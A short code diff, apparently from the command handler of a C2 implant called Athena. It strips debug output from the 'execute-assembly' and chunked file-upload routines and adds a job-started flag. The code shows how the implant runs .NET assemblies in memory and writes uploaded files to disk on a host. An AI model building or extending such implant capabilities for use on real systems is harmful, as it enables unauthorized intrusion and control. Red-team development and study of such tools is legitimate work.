@@ -34,10 +34,8 @@ namespace Athena.Commands
                     });
                     break;
                 case "execute-assembly":
-                    Console.WriteLine("[Task] " + Globals.executeAssemblyTask);
                     if (Globals.executeAssemblyTask != "")
                     {
-                        Console.WriteLine("errored.");
                         job.complete = true;
                         job.errored = true;
                         job.taskresult = "Failed to load assembly. Another assembly is already executing.";
@@ -47,6 +45,7 @@ namespace Athena.Commands
                     {
                         var t = Task.Run(() =>
                         {
+                            job.started = true;
                             job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                             Globals.executeAssemblyTask = job.task.id;
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
@@ -290,7 +289,6 @@ namespace Athena.Commands
                                     {
                                         try
                                         {
-                                            Console.WriteLine($"Writing Chunk: {uj.chunk_num}/{uj.total_chunks}");
                                             Misc.AppendAllBytes(uj.path, Misc.Base64DecodeToByteArray(uj.chunkUploads[uj.chunk_num]));
                                             //Finished with chunk, remove it.
                                             uj.chunkUploads.Remove(uj.chunk_num);
